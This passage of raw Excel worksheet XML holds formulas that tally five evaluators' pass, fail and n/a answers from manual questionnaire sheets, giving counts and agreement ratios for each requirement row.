        <f t="array" ref="L3">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("no",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("FAIL",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>0</v>
      </c>
      <c r="M3" s="1">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"n/a")</f>
        <v>0</v>
      </c>
      <c r="N3" s="1">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;0")</f>
        <v>5</v>
      </c>
      <c r="O3" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>1</v>
      </c>
      <c r="P3" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0</v>
      </c>
      <c r="Q3" s="40">
        <f>Table4123[[#This Row],[Total N/A Responses]]/5</f>
        <v>0</v>
      </c>
    </row>
    <row r="4" spans="1:17" ht="63.9" customHeight="1">
      <c r="A4" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B4" s="4">
        <v>2.2000000000000002</v>
      </c>
      <c r="C4" s="1" t="s">
        <v>33</v>
      </c>
      <c r="D4" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E4" s="2" t="s">
        <v>66</v>
      </c>
      <c r="F4" s="1" t="b">
        <f>'Manual Questionnaire 1'!F8</f>
        <v>0</v>
      </c>
      <c r="G4" s="1" t="str">
        <f>'Manual Questionnaire 2'!F8</f>
        <v>TRUE-ish</v>
      </c>
      <c r="H4" s="1" t="b">
        <f>'Manual Questionnaire 3'!F8</f>
        <v>0</v>
      </c>
      <c r="I4" s="1" t="str">
        <f>'Manual Questionnaire 4'!F8</f>
        <v>yes</v>
      </c>
      <c r="J4" s="1" t="str">
        <f>'Manual Questionnaire 5'!G4</f>
        <v>Fail</v>
      </c>
      <c r="K4" s="1" cm="1">
        <f t="array" ref="K4">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("PASS",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>2</v>
      </c>
      <c r="L4" s="1" cm="1">
        <f t="array" ref="L4">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("no",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("FAIL",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>3</v>
      </c>
      <c r="M4" s="38">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"n/a")</f>
        <v>0</v>
      </c>
      <c r="N4" s="1">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;0")</f>
        <v>5</v>
      </c>
      <c r="O4" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0.4</v>
      </c>
      <c r="P4" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0.6</v>
      </c>
      <c r="Q4" s="40">
        <f>Table4123[[#This Row],[Total N/A Responses]]/5</f>
        <v>0</v>
      </c>
    </row>
    <row r="5" spans="1:17" ht="39" customHeight="1">
      <c r="A5" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B5" s="4">
        <v>2.2999999999999998</v>
      </c>
      <c r="C5" s="1" t="s">
        <v>34</v>
      </c>
      <c r="D5" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E5" s="1" t="s">
        <v>74</v>
      </c>
      <c r="F5" s="1" t="b">
        <f>'Manual Questionnaire 1'!F9</f>
        <v>0</v>
      </c>
      <c r="G5" s="1">
        <f>'Manual Questionnaire 2'!F9</f>
        <v>0</v>
      </c>
      <c r="H5" s="1" t="b">
        <f>'Manual Questionnaire 3'!F9</f>
        <v>0</v>
      </c>
      <c r="I5" s="1" t="str">
        <f>'Manual Questionnaire 4'!F9</f>
        <v>yes?</v>
      </c>
      <c r="J5" s="1">
        <f>'Manual Questionnaire 5'!G5</f>
        <v>0</v>
      </c>
      <c r="K5" s="1" cm="1">
        <f t="array" ref="K5">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("PASS",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>1</v>
      </c>
      <c r="L5" s="1" cm="1">
        <f t="array" ref="L5">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("no",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("FAIL",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>2</v>
      </c>
      <c r="M5" s="1">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"n/a")</f>
        <v>0</v>
      </c>
      <c r="N5" s="1">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;0")</f>
        <v>3</v>
      </c>
      <c r="O5" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0.33333333333333331</v>
      </c>
      <c r="P5" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0.66666666666666663</v>
      </c>
      <c r="Q5" s="40">
        <f>Table4123[[#This Row],[Total N/A Responses]]/5</f>
        <v>0</v>
      </c>
    </row>
    <row r="6" spans="1:17" ht="32.1" customHeight="1">
      <c r="A6" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B6" s="4">
        <v>2.4</v>
      </c>
      <c r="C6" s="1" t="s">
        <v>11</v>
      </c>
      <c r="D6" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E6" s="1" t="s">
        <v>75</v>
      </c>
      <c r="F6" s="1" t="b">
        <f>'Manual Questionnaire 1'!F10</f>
        <v>1</v>
      </c>
      <c r="G6" s="1" t="b">
        <f>'Manual Questionnaire 2'!F10</f>
        <v>1</v>
      </c>
      <c r="H6" s="1" t="b">
        <f>'Manual Questionnaire 3'!F10</f>
        <v>0</v>
      </c>
      <c r="I6" s="1" t="str">
        <f>'Manual Questionnaire 4'!F10</f>
        <v>maybe; see comment on 2.2</v>
      </c>
      <c r="J6" s="1" t="str">
        <f>'Manual Questionnaire 5'!G6</f>
        <v>Fail</v>
      </c>
      <c r="K6" s="1" cm="1">
        <f t="array" ref="K6">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("PASS",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>2</v>
      </c>
      <c r="L6" s="1" cm="1">
        <f t="array" ref="L6">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("no",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("FAIL",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>2</v>
      </c>
      <c r="M6" s="38">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"n/a")</f>
        <v>0</v>
      </c>
      <c r="N6" s="1">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;0")</f>
        <v>5</v>
      </c>
      <c r="O6" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0.4</v>
      </c>
      <c r="P6" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0.4</v>
      </c>
      <c r="Q6" s="40">
        <f>Table4123[[#This Row],[Total N/A Responses]]/5</f>
        <v>0</v>
      </c>
    </row>
    <row r="7" spans="1:17" ht="27.9" customHeight="1">
      <c r="A7" s="1" t="s">
        <v>10</v>
      </c>
      <c r="B7" s="4">
        <v>2.5</v>
      </c>
      <c r="C7" s="1" t="s">
        <v>56</v>
      </c>
      <c r="D7" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E7" s="2" t="s">
        <v>67</v>
      </c>
      <c r="F7" s="1" t="b">
        <f>'Manual Questionnaire 1'!F11</f>
        <v>0</v>
      </c>
      <c r="G7" s="1">
        <f>'Manual Questionnaire 2'!F11</f>
        <v>0</v>
      </c>
      <c r="H7" s="1" t="b">
        <f>'Manual Questionnaire 3'!F11</f>
        <v>0</v>
      </c>
      <c r="I7" s="1" t="str">
        <f>'Manual Questionnaire 4'!F11</f>
        <v>yes</v>
      </c>
      <c r="J7" s="1" t="str">
        <f>'Manual Questionnaire 5'!G7</f>
        <v xml:space="preserve">PASS
</v>
      </c>
      <c r="K7" s="1" cm="1">
        <f t="array" ref="K7">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("PASS",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>2</v>
      </c>
      <c r="L7" s="1" cm="1">
        <f t="array" ref="L7">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("no",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("FAIL",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>2</v>
      </c>
      <c r="M7" s="1">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"n/a")</f>
        <v>0</v>
      </c>
      <c r="N7" s="1">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;0")</f>
        <v>4</v>
      </c>
      <c r="O7" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0.5</v>
      </c>
      <c r="P7" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0.5</v>
      </c>
      <c r="Q7" s="40">
        <f>Table4123[[#This Row],[Total N/A Responses]]/5</f>
        <v>0</v>
      </c>
    </row>
    <row r="8" spans="1:17" ht="45.9" customHeight="1">
      <c r="A8" s="1" t="s">
        <v>12</v>
      </c>
      <c r="B8" s="4" t="s">
        <v>235</v>
      </c>
      <c r="C8" s="1" t="s">
        <v>40</v>
      </c>
      <c r="D8" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E8" s="1" t="s">
        <v>41</v>
      </c>
      <c r="F8" s="1" t="str">
        <f>'Manual Questionnaire 1'!F14</f>
        <v>n/a</v>
      </c>
      <c r="G8" s="1" t="str">
        <f>'Manual Questionnaire 2'!F14</f>
        <v>TRUE-ish</v>
      </c>
      <c r="H8" s="1" t="b">
        <f>'Manual Questionnaire 3'!F14</f>
        <v>1</v>
      </c>
      <c r="I8" s="1" t="str">
        <f>'Manual Questionnaire 4'!F14</f>
        <v>yes</v>
      </c>
      <c r="J8" s="1" t="str">
        <f>'Manual Questionnaire 5'!G8</f>
        <v xml:space="preserve">PASS-ish
</v>
      </c>
      <c r="K8" s="1" cm="1">
        <f t="array" ref="K8">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("PASS",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>4</v>
      </c>
      <c r="L8" s="1" cm="1">
        <f t="array" ref="L8">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("no",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("FAIL",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>0</v>
      </c>
      <c r="M8" s="38">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"n/a")</f>
        <v>1</v>
      </c>
      <c r="N8" s="1">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;0")</f>
        <v>5</v>
      </c>
      <c r="O8" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0.8</v>
      </c>
      <c r="P8" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0</v>
      </c>
      <c r="Q8" s="40">
        <f>Table4123[[#This Row],[Total N/A Responses]]/5</f>
        <v>0.2</v>
      </c>
    </row>
    <row r="9" spans="1:17" ht="48" customHeight="1">
      <c r="A9" s="1" t="s">
        <v>12</v>
      </c>
      <c r="B9" s="4" t="s">
        <v>236</v>
      </c>
      <c r="C9" s="1" t="s">
        <v>59</v>
      </c>
      <c r="D9" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E9" s="1" t="s">
        <v>77</v>
      </c>
      <c r="F9" s="1" t="str">
        <f>'Manual Questionnaire 1'!F16</f>
        <v>n/a</v>
      </c>
      <c r="G9" s="1">
        <f>'Manual Questionnaire 2'!F16</f>
        <v>0</v>
      </c>
      <c r="H9" s="1" t="b">
        <f>'Manual Questionnaire 3'!F16</f>
        <v>0</v>
      </c>
      <c r="I9" s="1" t="str">
        <f>'Manual Questionnaire 4'!F16</f>
        <v>yes</v>
      </c>
      <c r="J9" s="1">
        <f>'Manual Questionnaire 5'!G9</f>
        <v>0</v>
      </c>
      <c r="K9" s="1" cm="1">
        <f t="array" ref="K9">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("PASS",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>1</v>
      </c>
      <c r="L9" s="1" cm="1">
        <f t="array" ref="L9">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("no",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("FAIL",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>1</v>
      </c>
      <c r="M9" s="1">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"n/a")</f>
        <v>1</v>
      </c>
      <c r="N9" s="1">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;0")</f>
        <v>3</v>
      </c>
      <c r="O9" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0.33333333333333331</v>
      </c>
      <c r="P9" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0.33333333333333331</v>
      </c>
      <c r="Q9" s="40">
        <f>Table4123[[#This Row],[Total N/A Responses]]/5</f>
        <v>0.2</v>
      </c>
    </row>
    <row r="10" spans="1:17" ht="32.1" customHeight="1">
      <c r="A10" s="1" t="s">
        <v>14</v>
      </c>
      <c r="B10" s="4" t="s">
        <v>60</v>
      </c>
      <c r="C10" s="1" t="s">
        <v>61</v>
      </c>
      <c r="D10" s="1" t="s">
        <v>287</v>
      </c>
      <c r="E10" s="1" t="s">
        <v>77</v>
      </c>
      <c r="F10" s="1" t="str">
        <f>'Manual Questionnaire 1'!F17</f>
        <v>n/a</v>
      </c>
      <c r="G10" s="1">
        <f>'Manual Questionnaire 2'!F17</f>
        <v>0</v>
      </c>
      <c r="H10" s="1" t="b">
        <f>'Manual Questionnaire 3'!F17</f>
        <v>0</v>
      </c>
      <c r="I10" s="1" t="str">
        <f>'Manual Questionnaire 4'!F17</f>
        <v>n/a</v>
      </c>
      <c r="J10" s="1">
        <f>'Manual Questionnaire 5'!G10</f>
        <v>0</v>
      </c>
      <c r="K10" s="1" cm="1">
        <f t="array" ref="K10">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=TRUE)+ISNUMBER(SEARCH("TRUE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("yes",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("PASS",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>0</v>
      </c>
      <c r="L10" s="1" cm="1">
        <f t="array" ref="L10">SUMPRODUCT(--((Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("no",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))+ISNUMBER(SEARCH("FAIL",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]]&amp;""))&gt;0))</f>
        <v>1</v>
      </c>
      <c r="M10" s="38">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"n/a")</f>
        <v>2</v>
      </c>
      <c r="N10" s="1">
        <f>COUNTIFS(Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;",Table4123[[#This Row],[Evaluator Determination 1]:[Evaluator Determination 5]],"&lt;&gt;0")</f>
        <v>3</v>
      </c>
      <c r="O10" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total PASS Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0</v>
      </c>
      <c r="P10" s="39">
        <f>IF(Table4123[[#This Row],[Total Responses (evaluation not blank)]]=0,"",IF(Table4123[[#This Row],[Decision if TRUE]]="PASS",Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]],1-Table4123[[#This Row],[Total FAIL Evaluations]]/Table4123[[#This Row],[Total Responses (evaluation not blank)]]))</f>
        <v>0.33333333333333331</v>
      </c>
      <c r="Q10" s="40">
        <f>Table4123[[#This Row],[Total N/A Responses]]/5</f>
        <v>0.4</v>
      </c>
    </row>
    <row r="12" spans="1:17" ht="16.2" thickBot="1">
      <c r="E12" s="10" t="s">
        <v>317</v>
      </c>
      <c r="F12" s="41">
        <f>COUNTIFS(Table4123[Evaluator Determination 1],"&lt;&gt;",Table4123[Evaluator Determination 1],"&lt;&gt;0")</f>
        <v>9</v>
      </c>
      <c r="G12" s="41">
        <f>COUNTIFS(Table4123[Evaluator Determination 2],"&lt;&gt;",Table4123[Evaluator Determination 2],"&lt;&gt;0")</f>
        <v>5</v>
      </c>
      <c r="H12" s="41">
        <f>COUNTIFS(Table4123[Evaluator Determination 3],"&lt;&gt;",Table4123[Evaluator Determination 3],"&lt;&gt;0")</f>
        <v>9</v>
      </c>
      <c r="I12" s="41">
        <f>COUNTIFS(Table4123[Evaluator Determination 4],"&lt;&gt;",Table4123[Evaluator Determination 4],"&lt;&gt;0")</f>
        <v>8</v>
      </c>
      <c r="J12" s="41">
        <f>COUNTIFS(Table4123[Evaluator Determination 5],"&lt;&gt;",Table4123[Evaluator Determination 5],"&lt;&gt;0")</f>
        <v>5</v>
      </c>
    </row>
    <row r="13" spans="1:17" ht="16.8" thickTop="1" thickBot="1">
      <c r="E13" s="10" t="s">
        <v>316</v>
      </c>
      <c r="F13" s="41" cm="1">
        <f t="array" ref="F13">SUMPRODUCT(--((Table4123[Evaluator Determination 1]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[Evaluator Determination 1]&amp;""))+ISNUMBER(SEARCH("no",Table4123[Evaluator Determination 1]&amp;""))+ISNUMBER(SEARCH("Fail",Table4123[Evaluator Determination 1]&amp;""))&gt;0))</f>
        <v>4</v>
      </c>
      <c r="G13" s="41" cm="1">
        <f t="array" ref="G13">SUMPRODUCT(--((Table4123[Evaluator Determination 2]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[Evaluator Determination 2]&amp;""))+ISNUMBER(SEARCH("no",Table4123[Evaluator Determination 2]&amp;""))+ISNUMBER(SEARCH("Fail",Table4123[Evaluator Determination 2]&amp;""))&gt;0))</f>
        <v>0</v>
      </c>
      <c r="H13" s="41" cm="1">
        <f t="array" ref="H13">SUMPRODUCT(--((Table4123[Evaluator Determination 3]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[Evaluator Determination 3]&amp;""))+ISNUMBER(SEARCH("no",Table4123[Evaluator Determination 3]&amp;""))+ISNUMBER(SEARCH("Fail",Table4123[Evaluator Determination 3]&amp;""))&gt;0))</f>
        <v>7</v>
      </c>
      <c r="I13" s="41" cm="1">
        <f t="array" ref="I13">SUMPRODUCT(--((Table4123[Evaluator Determination 4]=FALSE)+ISNUMBER(SEARCH("FALSE",Table4123[Evaluator Determination 4]&amp;""))+ISNUMBER(SEARCH("no",Table4123[Evaluator Determination 4]&amp;""))+ISNUMBER(SEARCH("Fail",Table4123[Evaluator Determination 4]&amp;""))&gt;0))</f>
        <v>0</v>
      </c>
      <c r="J13" s="41" cm="1">
